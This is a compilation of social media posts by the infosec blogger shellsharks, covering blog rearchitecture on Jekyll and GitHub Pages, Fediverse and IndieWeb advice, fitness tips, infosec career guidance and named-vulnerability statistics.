I am considering a major rearchitecture of my site, https://shellsharks. com (and adjacent properties) and wanted to get some advice/tips from the wider #indieweb, #blogging, #openweb, #webdev, #webdevelopment communities out here. (Sorry for the long read!) Currently, my site is hosted on Github Pages which uses #jekyll for static site generation. I&#39;ve been using this for nearly 5 years and for the most part have no complaints. The service has decent uptime, is pretty customizable (custom CSS, JS, etc. . . ) and after all this time I am pretty comfortable using it. Some things I am interested in though in terms of re-architecting. . . - Fediverse / ActivityPub compatibility - #wordpress has gone live with their AP plugin and sites like micro. blog (I think) have some direct AP functionality. I&#39;m interested in exploring this but it&#39;s not necessarily a must-have. More on Fediverse point of presence later. . . - IndieWeb functionality - I&#39;ve baked in as much IndieWeb stuff as I can reasonably do with Jekyll hosted on Git Pages but would be interested in WebMention and other more advanced capabilities if offered by another platform / static-site generator. - I&#39;ve toyed with the idea of self-hosting the blog (on AWS or something), while still using an SSG of some kind. There could be some benefits with adding more dynamic content or having more autonomy over my site but not sure if it&#39;d be worth additional costs or headache trying to manage. - Writing (or generally producing &quot;content&quot;) has always been something I do out of pure enjoyment but I&#39;ve considered trying to monetize in some way. What are some platform considerations if I wanted to monetize say, a podcast, newsletter, video courses, premium articles, etc. . . -- Other adjacent properties I&#39;m looking to &quot;re-design&quot;. . . - My #podcast is currently hosted on #Podbean, which I have liked so far but I&#39;d like to further embrace the Fediverse so have considered moving to #Castopod. Any advice on hosted vs. self-hosted? Are there other non-Castopod fediverse options? - As of right now, my presence in the Fediverse is mostly on infosec. exchange where I post stuff from my site. I&#39;ve considered hosting my own instance of Mastodon (or something similar) to be my main account or even just as an official &quot;shellsharks the site&quot; account. I&#39;ve seen accounts of people going down this path and ultimately bailing due to costs, time overhead, etc. . . -- If there are noticeable benefits to making any significant changes I&#39;d be willing to take that on as a project for 2024. Otherwise, I might just stick with what I have and focus on writing/research =). Thanks so much to anyone who takes the time to read / respond! #githubpages #activitypub #staticsite #selfhosted #selfhosting shellsharks @shellsharks 2023-12-22T22:22:31Z @grimmware on my reading list now üëÄ shellsharks @shellsharks 2023-12-22T22:47:47Z @Ichinin this this this this. So much this. Hate substack and Medium for this. shellsharks @shellsharks 2023-12-23T00:45:55Z @jerry that is looking good. I may even replace my main Lemmy app ‚ÄúAvelon‚Äù. Thunder has great UI and customizations but a little wonky on loading messages/replies/mentions. shellsharks @shellsharks 2023-12-23T18:25:01Z I‚Äôve discovered a lot of great infosec-related accounts lately, some from boosts and others from just scrolling the infosec. exchange Local feed. One thing I‚Äôve noticed looking at all these accounts is almost none of them have an intro post and if they do they didn‚Äôt pin that post in their profile. Having a pinned post that others can boost is arguably more important than having a fleshed out bio imo. shellsharks @shellsharks 2023-12-23T18:36:42Z @aircooledcafe I don‚Äôt do a lot of photo work so not sure I could give you great advice there. But I have been using it as my main computer for research, blogging, consumption, etc‚Ä¶ and it has worked very well! I doubt you‚Äôd notice much of a difference performance wise between two of the same iPad but if you have very large projects you might see real benefits in having the extra storage. shellsharks @shellsharks 2023-12-24T11:14:37Z @andre @smallcircles Thanks!! üôè shellsharks @shellsharks 2023-12-24T15:09:01Z @mttaggart I keep seeing your posts on threads first, engaging there then seeing it on Mastodon and wishing I had responded here instead üòÖ shellsharks @shellsharks 2023-12-24T16:22:17Z @singe @mttaggart Since mastodon isn‚Äôt algorithmic, I tend to ‚Äúcomplete‚Äù my Mastodon timeline scroll rather quick and then I go to threads and bop around for a bit. So even though I consider my main social app to be Mastodon, I actually probably spend a bit more time on threads certain days if my Mastodon feed is lighter. As an example, today I‚Äôve spend 30m MORE on threads than on Mastodon.

On basically every browser I&#39;ve tried, the text I&#39;ve positioned under this icon on my home page (https://shellsharks. com) appears correctly. But on FF, it floats kinda above the icon. From what I&#39;ve researched, there are some known issues with Firefox and the position:absolute tag but I just can&#39;t figure out a workaround/fix. What makes this more odd is I am doing what seems to be the exact same thing with the icon right next to this on my home page with text underneath and that one is working fine. Thanks for the help!!! #fedihelp shellsharks @shellsharks 2023-12-31T16:35:53Z @oobleck not yet. I‚Äôll give it a shot.

According to my Google Search Console, my site (shellsharks. com) is crawlable and indexable, but it is blocked because of my robots. txt file. When inspecting the robots. txt file WITH the Google search console it says everything is fine and I should not be blocked. Up until recently, I had a ‚Äúnoindex‚Äù meta tag in my HTML markup but have since deleted that line so that *shouldnt* be an issue any more. Anyone have any ideas why Google still believes my site is blocked by robots. txt? Is this just a wait until Google can organically crawl my site again after having deleted the noindex meta tag?

Everything from getting started, to scaling up, to optimizing, to dealing with all the edge cases and other operational craziness (which I know Jerry and the mod team has to deal with daily). I‚Äôve wanted to spin up my own server or at least have the know-how if needed for a while but am not particularly motivated since A. It seems like a lot of work and B. Jerry runs such a tight ship here. Maybe one day if you get bored you could whip something up üòÖ shellsharks @shellsharks 2024-01-02T13:36:39Z @akashgoswami Both #bluesky and #threads are pretty weak for #infosec stuff from what I‚Äôve encountered (and I‚Äôve put some non-trivial effort into finding folks there). I‚Äôd say Bluesky is not worth investing any time into. They aren‚Äôt going to increase their user base much at this point with Threads having established itself and given that it plans to federate / integrate with Mastodon via ActivityPub support. Threads is also building an API capability so it may have third-party app support, and more power user features in the near future. I have been on Threads but once they federate plan to not use their first-party app anymore in favor of just following the few threads accounts I find useful FROM Mastodon and continuing to use #ivory for consuming my collective Fediverse feed. shellsharks @shellsharks 2024-01-02T15:09:41Z I‚Äôve decided to dedicate 95% of my #Threads personality to yammering on about #Mastodon / the #fediverse and why people should #joinmastodon (and abandon Threads). As an example, here is my most recent plea to the #infosec folks of Threads to create Mastodon accounts and invest their social time here instead of there. My selfish reasons aside, after spending time in both worlds, Mastodon is *much* stronger for this community than Threads is right now. Yes, I know a federated future means a bridge between worlds but I still hold the belief that certain qualities of Mastodon will always make it a more habitable place for infosec folks than a place like Threads (e. g. posts longer than 500 words, posting exploit code that could be moderated out by Threads, PRIVACY implications, etc‚Ä¶) https://www. threads. net/@mk3s/post/C1mhs7JL2vo/ *Apologies to those who find any association with or time spent on Threads utterly irredeemable. My own feelings are mixed for sure. My dream is to get more people to invest not just in Mastodon, but in owning their own land on the Internet, i. e. #indieweb principles. Building a brand or relying on big tech for our identities on the web has been proven to be an awful decision. Even relying on well-maintained Mastodon instances is not without some danger. Leave Threads ‚û°Ô∏è Build a social graph on Mastodon ‚û°Ô∏è Buy a domain ‚û°Ô∏è Publish your *posts / content / w. e on your blog ‚û°Ô∏è Federate your blog (where possible) or simply expose an RSS feed ‚û°Ô∏è Establish a permanent identity on the web less reliant on others. shellsharks @shellsharks 2024-01-02T15:21:19Z An added benefit is I become the resident raving Fediverse / indieweb lunatic over there which I‚Äôm OK with. shellsharks @shellsharks 2024-01-02T15:25:39Z @spacerog OMG brb, going to go have 4 slices of pizza and 4 beers without gaining weight‚Ä¶ shellsharks @shellsharks 2024-01-02T18:04:06Z @ed209 I had a similar start to this effort I documented here https://shellsharks. com/notes/2023/11/13/decorporatization shellsharks @shellsharks 2024-01-02T18:07:46Z @pamoutaf GL! ü§û shellsharks @shellsharks 2024-01-02T18:09:22Z @kir5ty never made this mistake myself.

Nice to meet you as well. shellsharks @shellsharks 2024-01-04T15:01:05Z Adding some more info to my ‚ÄúMastodon starter pack‚Äù resource‚Ä¶ These are my personal ‚Äútop tips‚Äù (10 total) for getting started with / using #Mastodon. (More info in the linked page below) - When you come across an interesting post, Bookmark or otherwise save it! Finding old posts can be devilishly tricky. - Add a profile picture, short profile description and make an intro post (using the #intro hashtag) and pin that post to your profile. While you‚Äôre at it, if you have a personal/professional web site, link to your site in your profile and use Mastodon verification on the site! - Mastodon posts can be issued as ‚ÄúUnlisted‚Äù which prevents that post from showing up in people‚Äôs timelines. This is useful for replies with little useful context and for long multi-post threads, preventing you from spamming peoples feeds. - If you are on a small or mid-sized, somewhat focused instance, make sure to leverage your ‚ÄúLocal‚Äù feed to find interesting content and accounts. - Boost interesting posts, especially those from accounts with smaller followings. *We* are the algorithm and discovery is made a lot easier when people share. Plus it makes the original poster feel good and gives their account exposure which is nice. - Use a third-party Mastodon client. The first-party client is imo woefully underpowered. There are lot‚Äôs of great clients to choose from! (e. g. @ivory, @IceCubesApp, @mammoth, @trunksapp, @SoraSNS, etc‚Ä¶) - Follow accounts when you see something interesting from them. It‚Äôs easier to unfollow accounts later that you no longer like than it is to find interesting accounts after the fact. Hashtags are also a great source of discovery. - Want engagement? Want followers? Try engaging with posts and following people rather than posting into the void. - Bootstrap your feed by leveraging an importable follow list. (I‚Äôve provided some in the linked resource. ) - *Optional*: Enable search for your account! This is an opt-in feature but is great for people to help find you and your posts. https://shellsharks. com/notes/2023/10/20/infosec-mastodon-starter-pack shellsharks @shellsharks 2024-01-05T14:29:07Z @mitexleo Hii! üëã shellsharks @shellsharks 2024-01-05T14:57:00Z @R00tkitSMM damn‚Ä¶ üò¢ shellsharks @shellsharks 2024-01-05T15:10:03Z @imknotar0b0t I actually know of a few people that use curse words in their passwords.

My strategy‚Ä¶ - Workout consistently (I lifted 5-6x a week)- I also did cardio 2-3x a week (stationary bike, treadmill, basketball)- i tracked my calories. Focus on hitting protein goal (1g per desired lb). Aside from that try to stay below calorie target for weight loss. But if you‚Äôre exercising heavily you can easily go over by quite a lot. I was consistently 300-500 calories over daily but was exercising a lot. I stayed same weight but put on a lot of muscle. Caveats- you need a lot of time to workout. I spent like 1-2h a day (mostly at night) working out- eating right consistently requires time to plan and $$ to make/get food that is good and healthy. Good luck!! shellsharks @shellsharks 2024-01-05T19:00:21Z @aprotas I was on Twitter but not super active so I don‚Äôt miss it but ya know, for the aforementioned reason. Why do you miss it? What about Mastodon (so far) isn‚Äôt as good as Twitter for you? It took like a year but I‚Äôm finally at the point where I really love Mastodon. My timeline is rich with cool stuff and people are very helpful, even those who don‚Äôt follow me respond and help me with questions and stuff. shellsharks @shellsharks 2024-01-05T19:04:56Z @0x00string so i weight like anywhere from 200-210 lbs. so i try to hit 200-210+ g of protein daily. This is harder than it sounds while also not blowing through my calorie threshold. It has required me to focus on protein rich meals like 2/3 meals a day and I have two protein smoothies a day. My smoothies are like 60+g of protein each (yogurt, protein powder, nut butter, milk, fruit) shellsharks @shellsharks 2024-01-05T19:08:21Z @0x00string honestly sounds like you‚Äôre working out plenty. How long are your lifts? In terms of calorie burning cardio is probably better but you should be lifting a lot id your consuming a lot of protein. Focusing on eating less calories is probably your best bet and really the simplest (not necessiarily ‚Äúeasy‚Äù) way to lose weight. shellsharks @shellsharks 2024-01-05T19:31:22Z @alex_02 GitHub pages is an option https://pages. github. com/. It‚Äôs what I use and I‚Äôve enjoyed it. shellsharks @shellsharks 2024-01-05T20:05:41Z @0x00string Is it enough? Honestly I couldn‚Äôt tell ya. I‚Äôm certainly by no means a lifting expert or exercise guru. I can say though that it differs a lot from what I‚Äôve been up to from a lifting perspective. I actually wrote about getting into lifting and working out more here if you‚Äôre interested in a read https://shellsharks. com/notes/2023/11/11/fitness-quest. Basically, I got kinda outta shape, decided to try lifting for the first time in my life, and after a year+ now it‚Äôs been a pretty good and rewarding experience. To bootstrap the process, I actually got myself a physical trainer for a few sessions as they helped teach me some exercises, proper form, how to use the equipment at the gym, etc‚Ä¶ I‚Äôd say you should focus on A. Put together a more fleshed out workout program with all the core exercises. (FWIW, this is what my training splits looks like right now https://shellsharks. com/notes/2023/08/08/current-training-splits), B. Hit that protein goal and C. Keep calories down as much as you can, avoid unnecessary things like alcohol, sweets, soda, etc‚Ä¶ shellsharks @shellsharks 2024-01-06T01:22:14Z @jtk @jerry Yeah this ‚¨ÜÔ∏è. Anything you think can help from the citizens of the #jerryverse let us know! shellsharks @shellsharks 2024-01-06T01:58:48Z @aprotas Fair. How would you compare infosec/tech Mastodon to infosec/tech Twitter of old? I understand the echo-chamber-ey feeling you describe but I feel it‚Äôs been improving lately and will continue to do so as X evaporates. Honestly can‚Äôt see how bluesky ail be around long term either though. They‚Äôve skated by with the ‚Äúbeta‚Äù, invite-only vibes but they‚Äôll have to drop that eventually and people will get bored since I don‚Äôt think they‚Äôll amass many more users with mastodon and threads in the world.

Vulnerabilities are counted for a given year based on A. what their CVE ID is, or B.

[2] The year of Heartbleed, which is imo when this whole vuln naming madness really began. [3] 2019 we start to see a big spike in folks naming their vulnerabilties.

What makes it superior for you out of curiosity? Obviously having people there, i. e. popularity is a big part of what makes a social network *good* but mechanically what makes it good for you? There are bridges you can set up so that folks here can follow your posts there (and maybe even respond?) shellsharks @shellsharks 2024-01-08T01:48:41Z @wravoc If there was more of a community there, specifically infosec community I‚Äôd definitely invest more time there. Plus I like to see a lot of cool third-party clients and Nostr doesn‚Äôt seem there yet either. As for your list‚Ä¶ 1. You can host Fediverse instances from your own domain and/or verify your personal site natively through the Mastodon interface. 2. Federated social media certainly has some overhead and quirks when it comes to propagation but has some real strengths too. 3. From everything I‚Äôve heard, hosting Mastodon *is* a lot of work. Other Fediverse instance types are apparently easier (e. g. ice shrimp, etc‚Ä¶)4. Def no private messaging on Mastodon, but honestly I‚Äôd tell people to use signal or something for that rather than rely on any social network. 5. Nothing to add6. Not sure resiliency is really in the threat model for people who use Mastodon. But instance admins (in this case Jerry) has a lot of power to circle wagons in the event a wider calamity strikes the Fediverse at large. Honestly had my doubts about Mastodon when i first spun up my account in 2008 and it never stuck at the time. I came over again in earnest last year with no followers and didn;‚Äôt really understand the community or the platform but after investing a legit year here I *really* enjoy using it. Yeah it‚Äôs not perfect, but no social network is. But things seem healthy here, my timeline is rich, people are helpful and discoverability is solvable with time and some effort. Hopefully you decide to stay and give Mastodon a chance but I understand if you want to try and invest and build on Nostr or elsewhere.

This coincided with one of the larger migrations of #infosec folks to Mastodon. https://shellsharks. com/mastodon I have kept this post semi-updated with a lot of interesting Mastodon/Fediverse-related resources as well as information for the infosec community here. #mondayblogs #twittermigration shellsharks @shellsharks 2024-01-08T15:01:22Z @dwsmart Hey! So the new robots. txt file seems to have made my site crawlable+indexable but for some reason I can‚Äôt get Google to just crawl / index my entire site.

I‚Äôll throw this related ‚Äústat‚Äù in there as well‚Ä¶ - 70 ‚Äúnamed‚Äù vulnerabilities in 2023 https://shellsharks. com/notes/2024/01/05/named-vuln-counts-by-year shellsharks @shellsharks 2024-01-08T20:16:45Z @timb_machine Despite having maintained this resource (https://shellsharks. com/designer-vulnerabilities) for over 3 years I wouldn‚Äôt consider myself a named vulnerabilities expert or to have much useful insights into *why* some vulns get names and others don‚Äôt. It is, and for the most part always has been, some clever marketing but this particular question is probably best answered by security marketers / Vuln researchers themselves. My background is actually in Vulnerability Management (VM) and in that time (especially in the earlier days) I saw a lot of correlation between named vulns and severity but moreso between named vulns and what my CIO/CISO/sec management would bug me about üòÅ. Regardless of whether the Vuln had any real impact, if it had a name, it must be given special care! All this said, there was a noticeable dip in named vulns this year from last year and though thats not enough datapoints to say that Vuln naming is becoming less popular it is kinda interesting. shellsharks @shellsharks 2024-01-08T20:22:31Z @timb_machine haha ok gotcha. Now a joke article on this subject *is* in fact right in my wheelhouse üòÜ shellsharks @shellsharks 2024-01-08T22:38:49Z @muskless I‚Äôve been writing something up related to this. Too real. shellsharks @shellsharks 2024-01-09T11:58:02Z @timb_machine my guess: People remember that it is spelled where the second ‚ÄòA‚Äô is a symbol but forget which one and just assume ‚Äò@‚Äò is the logical choice. Which I can‚Äôt blame them for I suppose. shellsharks @shellsharks 2024-01-09T12:18:06Z @BagheeraAltered Have you considered moving off Substack considering all that‚Äôs come out related to them?

Looks like in the site map they are ‚Äúdiscovered‚Äù but not crawled. Both of these post types have good linkage and I think would be considered ‚Äúuseful‚Äù fwiw.

You can, and probably should be *happy* with what you have, but humans are wired to explore and thirst for more. Spend some time thinking about what you really want and ask yourself how much of _that_ do you have in your current role versus your ability to find it elsewhere. I‚Äôve left jobs where I was unhappy without thinking about what made me unhappy or more importantly what would be the *best* situation to move into and I always end up somewhere that isn‚Äôt really what I‚Äôve been looking for. After a while though, I started to realize that fulfillment was likely not going to come from work itself and I needed to seek it elsewhere. Hobbies, side projects, my professional-adjacent blog, networking, etc‚Ä¶ These are things that consistently bring me happiness where I don‚Äôt think work-proper really can. Perhaps you‚Äôd find it there too. shellsharks @shellsharks 2024-01-10T14:53:55Z @rishi Here‚Äôs some stuff I‚Äôve saved recently on AI sec if you wanna peruse‚Ä¶ - NIghtshade: https://arxiv. org/pdf/2310. 13828. pdf- AI Attack Surface Map: https://danielmiessler. com/p/the-ai-attack-surface-map-v1-0/- Extracting Training Data: https://not-just-memorization. github. io/extracting-training-data-from-chatgpt. html- EO on AI: https://www. whitehouse. gov/briefing-room/presidential-actions/2023/10/30/executive-order-on-the-safe-secure-and-trustworthy-development-and-use-of-artificial-intelligence/- OWASP Top 10: https://owasp. org/www-project-top-10-for-large-language-model-applications/- AI Village Threat Modeling: https://aivillage. org/large%20language%20models/threat-modeling-llm/ shellsharks @shellsharks 2024-01-10T15:29:04Z @eduard Not sure what the naming origin is.

Here‚Äôs kinda my philosophy‚Ä¶ https://shellsharks. com/notes/2023/07/06/split-social-personalities This said, I follow a lot of people here and most aren‚Äôt 100% or even 80% infosec, they have plenty of other types of things they chat about. Thats OK honestly. Id say as long as you set your replies to Unlisted and don‚Äôt spam the main timeline with 50 posts a day (infosec or not), you won‚Äôt run the risk of alienating anyone. shellsharks @shellsharks 2024-01-15T19:50:56Z @solene agreed. Got a Proton account a few months ago, working on transitioning fully off gmail still. shellsharks @shellsharks 2024-01-15T21:22:40Z @AssaultPepper @ed209 Yeah I loved Reddit back when and honestly would still get a lot of use out of it if I were to drag myself back there. I‚Äôm attempting a principled stand and trying to build something useful on the Fediverse. So as Ty said, I‚Äôm attempting to dedicate myself to this side and turn it into something more. Some communities (e. g. cybersecurity) are better poised to achieve this in shorter order. Smaller, more niche communities def have a harder grind to do it. shellsharks @shellsharks 2024-01-15T21:24:37Z @AlicornSkyler Definitely don‚Äôt recommend people running multiple accounts.

My daughter is 6 months old and her name is Skyler! üë∂ shellsharks @shellsharks 2024-01-16T14:19:32Z @djchateau OSCP is great, and I‚Äôm not saying it won‚Äôt look good on your resume or help you get an interview, but I wouldn‚Äôt go into it thinking it will solve your job search issues or land you a pentester role. There‚Äôs a couple things going on right now‚Ä¶ - Job market is being squeezed. January is here and that means it‚Äôs apparently layoff season. Layoffs means more talent in the job search pool and also means budgets for new roles across orgs is limited or non-existent. - Pentesting is probably THE most popular infosec role, which means LOTS of folks are trying to break in that way, which means consistently high competition in this space. - ‚ÄúEntry level‚Äù pentesting roles are hard to come by as it is, as it is often thought of as a more senior/experienced type of role. Instead of trying to find a ‚Äúpentester‚Äù role specifically, you should instead work on finding a ‚Äúsecurity engineer‚Äù role that includes some offensive responsibilities. Every company tends to hire engineer and/or analyst titles and though your day-today will likely not be exclusively pentesting, it could include that as a heavy chunk of what you do. Plus, ‚Äúengineers‚Äù make more $$ than most pure pentester roles from what I‚Äôve observed. Also, if you are currently unemployed, I would focus on getting any role you could across the infosec-proper spectrum. Some good places to look if you want to be offsec-adjacent would be Vulnerability Management, Application Security and Cloud Security. Good luck! Remember to not focus solely on certs as a way to boost your portfolio though. Here I‚Äôve written up some other things you can try‚Ä¶ https://shellsharks. com/cyber-clout shellsharks @shellsharks 2024-01-16T17:34:47Z @ohhelloana Ooo Good question. Probably a solid week or two. shellsharks @shellsharks 2024-01-16T17:40:38Z @djchateau Yeah the infosec industry has been like this for as long as I‚Äôve been in the field (so over 10 years now). Artificial barriers, moving targets in terms of what ‚Äúentry level‚Äù experience is, etc‚Ä¶ HR doesn‚Äôt know how to hire for these roles, managers often have unrealistic expectations, hoping to find ‚Äúunicorns‚Äù or ‚Äúrockstars‚Äù with every cert, MS degree, etc‚Ä¶ but these people just don‚Äôt exist at scale. Back when I was first looking for infosec work I had a degree, several years IT experience and even a cert and it still took me forever. It came down to just applying applying applying until my fingers and eyes bled pretty much. Best advice I can give ya is to work on high RoI things for your portfolio (see the link I sent) and apply to everything you can find. For as hard as it is to find work these days, it has always been 10x as hard for those trying to break in for reasons that still aren‚Äôt entirely clear to me, but probably gate-keepy related. Good luck! Try the #fedihired hashtag and leverage the sizable network of infosec folks on Mastodon. There are lots of managers, CISO‚Äôs, company founders, senior folks, etc‚Ä¶ shellsharks @shellsharks 2024-01-18T20:17:17Z I can‚Äôt overstate how much I hate #CSS. Extremely humbling trying to do anything resembling good, ‚Äúmodern‚Äù, responsive #webdesign. Been working on some heavier under-the-hood changes to my #githubpages-based #jekyll #staticwebsite and wow my eyes and soul hurt. A related question, anyone ever implement full-body text search on a static site / Jekyll site before? I‚Äôve been looking into maybe lunr. js‚Ä¶ #fedihelp #webdev shellsharks @shellsharks 2024-01-19T02:57:07Z @h4sh Nice.

You put out this call https://social. lol/@andycarolan/111782487111854210 for potential freelance work and I wanted to get an idea of your rate and what you thought of this project. Basically, I&#39;m looking for a logo (and maybe some other related art) for a newsletter I plan on spinning up soon. I&#39;m still working on the final name but I have it narrowed down a bit. Thanks! shellsharks @shellsharks 2024-01-19T20:21:10Z I&#39;ve talked about my dislike for #Medium in the past but after listening to the latest episode of @mike &#39;s Dot Social podcast (https://flipboard. social/@mike/111772770875141589) featuring @coachtony (CEO of Medium) I have a much different perspective on what Medium provides to both creators and those of us who still want to find something good and meaningful on the web. This comes at a time where companies like Google and Microsoft are destroying search at a furious speed. I still would like to see people embrace the #indieweb and not rely on centralized places for hosting their content but what Medium provides as a service to A. get people actually writing and B. Surface interesting things through human curation is imo really great. So anyways, I‚Äôm going to go check out some stuff on Medium and I suggest everyone go subscribe to the Dot Social podcast as each episode has really been fantastic so far. shellsharks @shellsharks 2024-01-20T03:49:23Z @jcrabapple Finally got around to throwing this up.

I read your post here and wanted to let you know about my own experience as a random writer on the web (understanding that everyone&#39;s experience differs). I started my blog in 2019 and expected to never really get any interest from people in terms of reading, using or getting feedback on what I had written. After nearly 5 years I&#39;ve been blown away with the reception and level of feedback I have gotten! So what do I think has helped me in terms of people discovering my site, enjoying it and giving me feedback?‚Ä¶ - Find a niche, write for that niche. I write about everything but a good bit of what I choose to write about is infosec. Now there is no dearth of infosec content out there but it is slightly more specialized than &quot;tech‚Äù for example. - Network it around! Or an IndieWeb speak, POSSE. You mention this in your piece but getting it out into specific Reddit channels, LinkedIn, Mastodon, etc. . has been great for getting feedback and spreading the world. - Keep pieces updated. A lot of my posts are not just point-in-time writings, but rather resources I keep up to date. This has helped what I write maintain relevance and serve as a resource for myself and others. - Make it unique. My site is not perfect, but its visual style is certainly unique. People have commented that they like me design, my site, my artwork, etc. . . In a world filled with cookie cutter Medium sites and other boring facades, this can definitely help. If your site is interesting, than you are by default a bit more interesting haha. - Though you should find a niche, also consider just writing about whatever you want and having that hosted on your site too. Some of my most popular (by SEO) posts are not infosec-related but rather things like a chair review or some of my work I did for my Masters. Cheers! shellsharks @shellsharks 2024-01-23T21:24:27Z @matthiasott I *kinda* do https://shellsharks. com/blogroll üòÅ shellsharks @shellsharks 2024-01-24T01:27:53Z @SecurityByAndrew It works.

Here are some awesome #infosec / #cybersecurity accounts I&#39;ve discovered in the past week. As usual, the Local feed at infosec. exchange pops off! - @gtr - @n2x4- @matteyeux- @obivan- @leonjza- @jasongarbis- @satoshi_tanda- @pawel_lukasik- @lukasberancz- @hackingump1 Bonus:- @adeptsof0xcc (I :ablobcatheart: this blog!) shellsharks @shellsharks 2024-01-26T20:42:14Z I&#39;ve been following @404mediaco since they went live last year and this most recent post from @jasonkoebler (https://mastodon. social/@jasonkoebler/111823811997186188) and the team there really got me thinking. (That toot links to https://www. 404media. co/why-404-media-needs-your-email-address/). They&#39;ve had some incredible stories and scoops over the last couple months. I see all the headlines come through Mastodon or RSS and I say &quot;wow that&#39;s crazy‚Äù, or ‚Äúdang, I never knew that‚Äù, but that doesn&#39;t always translate into me fully reading the post. Maybe I don&#39;t have time to read it, maybe I mean to but then forget, in other cases I think the story is interesting but doesn&#39;t necessarily impact me specifically. But these stories are meant to be read, they *need* to be read, maybe not by me all the time, but by someone‚Ä¶ in reality, A LOT of someones if you ask me. Everything they call out in terms of rampaging AI theft, social network decay, traditional journalism in freefall, etc. . . is no joke. I&#39;m seeing it happen each day and it is in fact quite troubling. I&#39;ll admit, I&#39;ve always relied on the free-ness of stuff on the web and as a result have been somewhat reluctant to choose creators/publications to support. But given the state of the web, HELL, the state of the *world*, I really can&#39;t justify that any more. I want to see more of what 404 produces, and to help ensure that, I plan to support that end. I&#39;ve also been working on a list of other causes, publications, etc. . . to support as this I feel is an ever precarious point in time. (If you have any suggestions I would be interested in hearing what you believe could use the support - comment or DM me). So what&#39;s my point? I suppose it&#39;s support what you like, what&#39;s impactful, what&#39;s important to not just you but to everyone, otherwise it may vanish. The world has changed and I need to as well. shellsharks @shellsharks 2024-01-26T22:38:37Z @1s6bp Welcome back.

I think if they were to come by way of the &quot;traditional&quot; Fediverse, there would be the usual loud subset of folks here who would attempt to shout them away. I believe the majority of people would either want them here or be indifferent. After all, since our feeds aren&#39;t ruled by algos, it&#39;s easy enough to keep them corpo-free if we want. This said, with the coming of Threads, the Fediverse (at least the parts of it that won&#39;t wall up) will have plenty of brands soon enough. shellsharks @shellsharks 2024-01-27T13:34:45Z @Hidde We&#39;ll be here, tootin&#39; away üêò. shellsharks @shellsharks 2024-01-27T13:37:53Z @imajeanpeace ü§£ shellsharks @shellsharks 2024-01-27T13:40:16Z @raptor @Lee_Holmes @buherator I saved this thread to follow up on this exact question - https://infosec. exchange/@neilmadden/111776304723415347 shellsharks @shellsharks 2024-01-28T02:43:20Z @ben I maintain a (pretty up-to-date) list of stuff I use on my Mac here https://shellsharks. com/mac-tools. shellsharks @shellsharks 2024-01-28T02:54:29Z @bens Though I *do* agree with you here, I have a better understanding these days of what Medium provides to both writers and readers. I wrote this up about a week ago about this very topic https://shellsharks. com/notes/2024/01/19/a-different-perspective-on-medium. I&#39;ve always disliked Medium for the reason you mentioned and a few others but these days (thanks in large part to listening to the podcast that I mention in the linked note) I understand what Medium *does* provide to the current Internet. Yes, it&#39;d be *far* preferable to me if people just had their own blog rather than relying on Medium, but that low barrier-to-entry is so appealing for writers who do not want to &quot;tech&quot; anything. For anyone wondering what&#39;s out there aside from Medium, check out this list I&#39;ve started compiling of great Indie hosting options https://shellsharks. com/indieweb#hosting. This list doesn&#39;t even include traditional places to host a great blog like WordPress, Github Pages (where my blog is actually hosted), Squarespace, Blogger, Neocities, etc‚Ä¶ shellsharks @shellsharks 2024-01-28T03:14:46Z @deadsuperhero If you have any interest in getting into infosec in any capacity and have any questions or looking to network or be introduced to folks in the industry feel free to reach out! shellsharks @shellsharks 2024-01-28T03:34:20Z @adamshostack My how-I-follow strategy kinda looks like this‚Ä¶ - I see something interesting from an account I don&#39;t follow and want to consider following them. - As you said, I pop into their profile and look at their recent posts (maybe like 5-10). If they are like 2/3+ interesting and not like 90% just boosts then I will follow. - For the previous step, I like to lean on more liberally following accounts that are somewhat consistently interesting as I have found it is MUCH harder to find an account later than it is to simply unfollow them if they become too noisy, off-topic, or not what I want to see in my timeline. - I also am FAR more careful following someone if they are a very frequent poster. Anything more than like 3-5x /day and you have to be pretty high signal. In my experience, there are enough people I follow who will boost the one interesting thing out of every 50 posts an account like this would toot so I still get it in my timeline without having to follow them. - Operationally, as you scroll your feed, be mindful of accounts you are seeing that post too much, or about things you dont care about and be perfectly willing to unfollow. Pruning is a big part of keeping your timeline enjoyable and manageable. - I also actually run two Mastodon accounts (not that I would recommend this approach but it kinda helps in this one regard). This account is mostly dedicated to infosec stuff. I try to mostly write about infosec (or Mastodon meta) and follow infosec accounts. My other Masto account is for *everything* else. This means I can experiment more with who I follow there and not have to worry about missing things over here. A similar strategy could be deployed via Lists here as well if lists were a thing someone wanted to manage and try. - Sometimes I follow because I see someone from an interesting instance that I&#39;ve never seen before and see that as an opportunity to get boosts from them which would in theory be places across the Fediverse that I don&#39;t that much reach in to. - Finding serial boosters is in many cases too much of a burden on a timeline, but having a few solid accounts who do this in your follow list is great as it helps keep your timeilne more dynamic and interesting, having it fed accounts from all over the Fediverse. - Other times it‚Äôs just vibes. They say something funny, they have an interesting profile, etc. . . For those who only post every once in a while, it has very little effect to just go and follow them as you‚Äôll only have to scroll past an item of theirs every once in a while. - I don&#39;t give much weight to whether I&#39;m being followed by an account or follow-backs or anything like that. I follow people because I enjoy what they have to say, not because I want them to have to listen to me haha. shellsharks @shellsharks 2024-01-28T04:33:56Z @technotenshi @technomike Howdy and welcome! ü§†üëã shellsharks @shellsharks 2024-01-29T01:51:20Z @Scorpion_Byte13 I can give you at least ‚ÄúCybersecurity focused‚Äù.

So because of this, people&#39;s feeds go stale and they think Mastodon is dead, so they too leave or take a break. This said, I think Mastodon should add create-your-own-algo kinda feature like Bsky has so that people who don&#39;t/can&#39;t feed themselves are instead spoon-fed. Make it opt-in if that makes Mastodon devs feel better ü§∑‚Äç‚ôÇÔ∏è. shellsharks @shellsharks 2024-02-05T21:37:55Z @aircooledcafe I don&#39;t see the big deal with this tbh. I use 1P and all my creds are stored locally on all devices I have. Cloud service is only needed for sync (maybe?) and account sign-in/verification stuff. shellsharks @shellsharks 2024-02-05T21:38:16Z @darrenpmeyer sounds dope. Good luck! shellsharks @shellsharks 2024-02-07T01:35:58Z @filippo - Yes, opt-in, customizable algo feeds are awesome and need to come here. - How so? This seems to be based on the friends you keep. I&#39;m in infosec and my feed is almost exclusively hacker-types who of course very much support the same. . . is this what you mean? - Federation, or decentralized nature of Fediverse/Mastodon is an overall benefit compared to the weaknesses of these traditional centralized networks. Look no further than X. Bsky is no different. It would be nice to see this issue with federating stuff for smaller issues be sorted though. - My fav feature of Bsky is the domain-as-your-handle. Wish mastodon could do something like this too. Like, I could still be @ infosec. exchange but also addressable via my domain or something. . . - Atmosphere is dependent yet again on the friends you keep. If who you follow is serious, your feed will be serious. There are plenty of unserious folks on here. 